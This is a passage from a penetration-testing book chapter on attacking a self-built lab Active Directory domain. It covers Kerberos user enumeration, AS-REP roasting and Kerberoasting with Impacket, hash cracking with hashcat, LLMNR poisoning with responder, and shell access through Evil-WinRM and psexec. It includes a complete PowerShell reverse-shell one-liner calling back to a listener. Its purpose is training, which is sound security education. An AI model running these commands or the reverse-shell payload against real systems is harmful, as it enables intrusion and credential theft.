  type: TYPE_NORMAL
- en: '](image/Figure_10.47_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.47 – Service status
  prefs: []
  type: TYPE_NORMAL
- en: 'Here we want to add the **LABCORP\Scada** group to the **Remote Management
    Users** group on the Windows 10 workstation:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.48 – Remote management group'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.48_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.48 – Remote management group
  prefs: []
  type: TYPE_NORMAL
- en: 'Under **Windows Defender Firewall with Advanced Security**, enable **Windows
    Remote Management**:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.49 – Windows Defender'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.49_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.49 – Windows Defender
  prefs: []
  type: TYPE_NORMAL
- en: This wraps up the installation and configuration of the workstation. We are
    now going to move on to the Kali VM, and ensure we have the tools installed to
    move forward.
  prefs: []
  type: TYPE_NORMAL
- en: Kali Linux tools
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Now that we have the corporate side of the network installed and configured,
    we will open up the Kali Linux attack box. From here, we need to install a few
    different tools that were mentioned in the *Technical requirements* section. These
    tools are extremely useful when dealing with Windows-based environments. I would
    say 100% of the companies that I have been involved with were all running some
    form and configuration of AD inside their corporate environment. The tools to
    install are listed as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Impacket**: The first tool that we are going to install on our Kali Linux
    VM will be Impacket. This is ultimately a library of Python classes that interact
    with Windows-based protocols at the packet level. This tool performs all the heavy
    lifting of building, connecting, maintaining, and tearing down a session. To get
    started, we want to use the following link: [https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'From here, download the latest package. When this is done, decompress the **.tar**
    file and simply run the following command inside the **impacket** folder:'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**python3 -m pip install .**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**Kerbrute**: Next, we want to install Kerbrute. This is a tool that automates
    the enumeration of AD accounts. Use the following link: [https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Make sure that you change the executability of the file.
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**Evil-WinRM**: Finally, we want to install **Evil-WinRM**. This is a tool
    for pentesting **Windows Remote Management** (**WinRM**). Run the following command:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**sudo gem install evil-winrm**'
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: In this section, we spent time building out a domain controller and workstation.
    We added AD, DNS, DHCP, and file share features to the domain controller. We created
    a domain and then added users to this domain, then joined the workstation to it.
    Finally, we made sure that our Kali Linux VM had the tools needed to "PWN" the
    corporate environment. In the next section, we will be using those tools we installed
    to move forward and launch attacks on the corporate side of the network.
  prefs: []
  type: TYPE_NORMAL
- en: Discovering and launching our attacks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We have the corporate lab established and configured, and we have installed
    new tools into our Kali distribution. The next item on the agenda is to start
    taking a look at the network that we have been dropped into. In [*Chapter 7*](B16321_07_Epub_AM.xhtml#_idTextAnchor081),
    *Scanning 101*, we covered a number of different tools. We can use them here to
    perform discovery attacks. However, I feel that it would be more appropriate to
    look at other methods to grow our pentesting arsenal.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s start by skipping over **rustscan** and **nmap** and jump right into
    enumerating host machines by their NetBIOS names. Run the **nbtscan** command
    on your current subnet by using the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: nbtscan 172.16.0.0/24
  prefs: []
  type: TYPE_NORMAL
- en: 'We should now see our two machines, **DC01** and **WS01**, as shown in the
    following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.50 – nbtscan'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.50_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.50 – nbtscan
  prefs: []
  type: TYPE_NORMAL
- en: 'Quickly identifying NetBIOS names allows us to take an educated guess that
    **DC01** is the domain controller. With this information in mind, we now want
    to run **enum4linux** against the discovered machine names, to see whether we
    can extract more detail. Run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: enum4linux 172.16.0.2
  prefs: []
  type: TYPE_NORMAL
- en: 'You should see the following results:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.51 – enum4linux'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.51_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.51 – enum4linux
  prefs: []
  type: TYPE_NORMAL
- en: 'We have now discovered the **LABCORP** domain name. From here, we want to try
    and enumerate users that may exist on the domain. Using Kerbrute (we installed
    this in the last section) will allow us to enumerate users by sending Kerberos
    requests to the domain controller. We do this by using a generated list of traditional
    ICS users that contains usernames such as these:'
  prefs: []
  type: TYPE_NORMAL
- en: '**admin**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**root**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**operator1**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**operator2**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**operator3**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**scada**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**scada-user**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**scada1**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**scada2**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'We can now run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: ./kerbrute_linux_amd64 userenum Industrial_Pentesting/users.txt -d labcorp.local
    -dc 172.16.0.2
  prefs: []
  type: TYPE_NORMAL
- en: 'You can see from the following output that we successfully enumerated four
    valid users:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.52 – Enumerated users'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.52_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.52 – Enumerated users
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we are going to use some sub-features of the Impacket tool that we installed
    in the last section. Specifically, we are going to run the **impacket-GetNPUsers**
    command to see whether any of the AD users have Kerberos preauthentication disabled.
    Run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: impacket-GetNPUsers labcorp.local/Adminstrator -dc-ip 127.16.0.2 -no-pass
  prefs: []
  type: TYPE_NORMAL
- en: 'And as expected, the **Administrator** account has **preauth** enabled, as
    shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.53 – Impacket administrator check'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.53_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.53 – Impacket administrator check
  prefs: []
  type: TYPE_NORMAL
- en: 'Now test another account. If you recall the AD user setup where we adjusted
    operator2''s config by disabling **preauth**, we should get a valid response by
    using the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: impacket-GetNPUsers labcorp.local/operator2 -dc-ip 127.16.0.2 -no-pass
  prefs: []
  type: TYPE_NORMAL
- en: 'You can see that we have discovered a hash for **operator2**:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.54 – operator2 hash'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.54_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.54 – operator2 hash
  prefs: []
  type: TYPE_NORMAL
- en: 'Discovering this hash, we can use **hashcat**. Use mode, **-m 18200** for Kerberos
    to crack this hash by running the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: sudo hashcat -m 18200 operator2.hash /usr/share/wordlists/rockyou.txt
  prefs: []
  type: TYPE_NORMAL
- en: 'Depending on the complexity of your password, this could take a fair amount
    of time. However, if you kept the current settings from earlier in the chapter,
    it will only take a few seconds to crack the **operator2** password. Here, you
    can see that at the end of the Kerberos hash, the password, **Password2**, has
    been appended, indicating that we have successfully cracked the hash:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.55 – operator2''s password'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.55_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.55 – operator2's password
  prefs: []
  type: TYPE_NORMAL
- en: 'We could simply use these newly discovered credentials to remote to the machine,
    or leverage them to do more discovery through Impacket. Since the title of this
    section is *Discovering and launching our attacks*, we are going to leverage this
    account to perform further discovery. We are going to run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: impacket-GetADUsers -all labcorp.local/operator2 -dc-ip 172.16.0.2
  prefs: []
  type: TYPE_NORMAL
- en: 'This will use **operator2** to enumerate all the AD users:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.56 – GetADUsers'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.56_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.56 – GetADUsers
  prefs: []
  type: TYPE_NORMAL
- en: 'Continuing down the discovery path, we are going to use another Impacket tool
    to extract service accounts using the default behavior of Kerberos. We are going
    to run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: impacket-GetUserSPNs labcorp.local/operator2:Password2 -dc-ip 172.16.0.2 -request
  prefs: []
  type: TYPE_NORMAL
- en: 'This is a very scary attack, as it does not require an elevated user to extract
    service accounts inside the domain controller. After running the command, you
    should see that we have discovered the SPN of **operator3**. This is from the
    Kerberos configuration portion of the last section:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.57 – SPN'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.57_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.57 – SPN
  prefs: []
  type: TYPE_NORMAL
- en: 'Once again, we have discovered a hash and, from looking at it, it appears to
    be Kerberos but in a different format. Doing some simple research, we discover
    that it is saved in TGS format. Now, we want to crack the hash using **hashcat**,
    by running the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: hashcat -m 13100 operator3.hash /usr/share/wordlists/rockyou.txt
  prefs: []
  type: TYPE_NORMAL
- en: 'This will then successfully crack the hash and present you with the following
    output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.58 – operator3 cracked password'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.58_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.58 – operator3 cracked password
  prefs: []
  type: TYPE_NORMAL
- en: Next, we are going to run **responder**. This gets installed with Impacket.
    Now, **responder** gives us the ability to poison **Link-Local Multicast Name
    Resolution** (**LLMNR**), and spoof an SMB request in order to capture Windows
    **New Technology LAN Manager** (**NTLM**) hashes on the network.
  prefs: []
  type: TYPE_NORMAL
- en: 'We are going to run **responder** with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: sudo responder -I eth1
  prefs: []
  type: TYPE_NORMAL
- en: 'You should get the following results showing that the poisoners are running
    and that the servers are live:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.59 – responder running'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.59_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.59 – responder running
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, to trigger the capture, as we have a very static lab environment, log
    into your Windows 10 VM and open your browser. Type in a string and press *Enter*:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.60 – Test'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.60_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.60 – Test
  prefs: []
  type: TYPE_NORMAL
- en: 'If everything is set up correctly, you should see that **responder** has captured
    the NTLM hash for **operator1**, as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.61 – NTLM hash'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.61_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.61 – NTLM hash
  prefs: []
  type: TYPE_NORMAL
- en: 'As we have done previously, we will use **hashcat** to crack the password for
    **operator1**. Run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: hashcat -m 5600 operator1.hash /usr/share/wordlists/rockyou.txt
  prefs: []
  type: TYPE_NORMAL
- en: 'The password should crack relatively fast and you will see the following result:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.62 – operator1 password'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.62_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.62 – operator1 password
  prefs: []
  type: TYPE_NORMAL
- en: In this section, you can see how easy it is, with the right tools, to start
    to enumerate a domain controller to gain useful insight into the corporate environment.
    We were able to enumerate credentials and discover domain accounts with a general
    user account. We were able to capture hashes by poisoning LLMNR, NBT-NS, and DNS/MDNS.
    Throughout the section, we used **hashcat** to perform various modes of cracking
    on the hashes that we discovered. We have barely touched on a fraction of the
    power that these tools contain. I strongly encourage you to read up on the documentation
    for enum4linux, Impacket, Kerbrute, and hashcat.
  prefs: []
  type: TYPE_NORMAL
- en: In the next section, we are going to leverage the **username:password** combinations
    that we discovered and cracked, to gain a foothold into the various systems in
    the corporate network.
  prefs: []
  type: TYPE_NORMAL
- en: Getting shells
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Now that we have three sets of credentials and a list of five additional usernames,
    it is time to leverage the credentials and land a foothold/shell into the corporate
    computers. We are going to leverage Evil-WinRM, Impacket-psexec, and PowerShell
    to perform various exploits to gain access to the Windows hosts.
  prefs: []
  type: TYPE_NORMAL
- en: 'We are going to start with **Evil-WinRM**, and we will be using the following
    credentials to see whether we can get a shell: **operator2:Password2**. Run the
    following command:'
  prefs: []
  type: TYPE_NORMAL
- en: evil-winrm -I 172.16.0.4 -u operator2 -p Password2
  prefs: []
  type: TYPE_NORMAL
- en: 'If everything has been configured correctly from the first section of this
    chapter, you will get the following result:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.63 – Evil-WinRM shell'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.63_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.63 – Evil-WinRM shell
  prefs: []
  type: TYPE_NORMAL
- en: '*Voilà*! We have our first shell, and now it is time to explore the capabilities
    of our new shell. Type in the **menu** command and press *Enter*. This will then
    bring up a list of post-exploit modules:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.64 – Evil-WinRM shell menu'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.64_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.64 – Evil-WinRM shell menu
  prefs: []
  type: TYPE_NORMAL
- en: Story Time
  prefs: []
  type: TYPE_NORMAL
- en: 'I remember having a conversation with Rob Mubix Fuller. He imparted a nugget
    of wisdom to me that had previously been passed on to him: *two is one and one
    is none*, meaning that if you have a shell and only one shell, you don''t really
    have any shells. You need a backup plan in case your primary session gets lost
    or severed. This has always stuck with me, and I will pass this insight on to
    you. So remember, if you land a shell, make sure to build a second one as fast
    as possible.'
  prefs: []
  type: TYPE_NORMAL
- en: 'With that said, we need to build out another shell. A great resource is **Payloads
    All The Things**. This can be accessed via the following link: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).'
  prefs: []
  type: TYPE_NORMAL
- en: 'We will be using the Reverse Shell Cheat Sheet to find a PowerShell method.
    The following code shows the PowerShell command that we will be using to connect
    back to our Kali Linux VM:'
  prefs: []
  type: TYPE_NORMAL
- en: client = New-Object System.Net.Sockets.TCPClient("172.16.0.6",4242);$stream
    = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,
    0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,
    $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS '
    + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  prefs: []
  type: TYPE_NORMAL
- en: 'To make this work in our current environment, we must disable **Real-time protection**
    on the Windows 10 VM:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.65 – Virus and threat protection settings'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.65_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.65 – Virus and threat protection settings
  prefs: []
  type: TYPE_NORMAL
- en: 'After disabling **Real-time protection**, we are going to set up a new listener
    using the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: nc -nvlp 4242
  prefs: []
  type: TYPE_NORMAL
- en: 'After executing the command, we will see the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.66 – Listener port 4242'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.66_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.66 – Listener port 4242
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we want to execute the PowerShell command from the previous figure. Once
    the reverse shell connects, we will see the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.67 – Reverse PowerShell'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.67_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.67 – Reverse PowerShell
  prefs: []
  type: TYPE_NORMAL
- en: 'Now we have successfully landed a reverse shell using the PowerShell payload.
    Next, we are going to run an exploit with Impacket-psexec to gain a new shell.
    We will be using the Domain Admin account that we created in the first section
    of this chapter. Start by running the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: impacket-psexec labcorp.local/lab.da:'Password123'@172.16.02
  prefs: []
  type: TYPE_NORMAL
- en: 'After running the preceding command, you will see the following outcome:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 10.68 – impacket-psexec'
  prefs: []
  type: TYPE_NORMAL
- en: '](image/Figure_10.68_B16321.jpg)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10.68 – impacket-psexec
  prefs: []
  type: TYPE_NORMAL
- en: After getting this far, you might be asking yourself – since we already have
    credentials, couldn't we just **Remote Desktop Protocol** (**RDP**) to the Windows
    host and try to exploit from there? You would be absolutely correct. You could
    use the credentials and RDP to the Windows host. However, you would have to be
    careful. However much we cover our tracks, there will always be a trail to follow.
    If you start to use RDP sessions, they can become very loud and you will most
    likely start to bump into the owners of the credentials that you have cracked
    because they could be logged into the machine.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This chapter has covered a lot of material. We built out a domain controller
    with AD, set up a DNS server and a DHCP server, created a file share, and used
    multiple tools to enumerate, poison traffic, and gain shells. Every one of these
    topics and tools is deserving of its own book. To be honest, writing about the
    corporate side after spending a career in the operational technology field does
    feel a bit like "imposter syndrome." I can certainly reaffirm the importance of
    practicing gaining access to individual hosts on the corporate network, as no
    two pentest engagements are alike. You cannot expect to succeed if you don't try
    harder and round out your skillset. In the next chapter, we will be diving deeper
    into the network by pivoting through our current lab setup to examine the process
    level and ultimately end up controlling the physical I/O.
  prefs: []
  type: TYPE_NORMAL
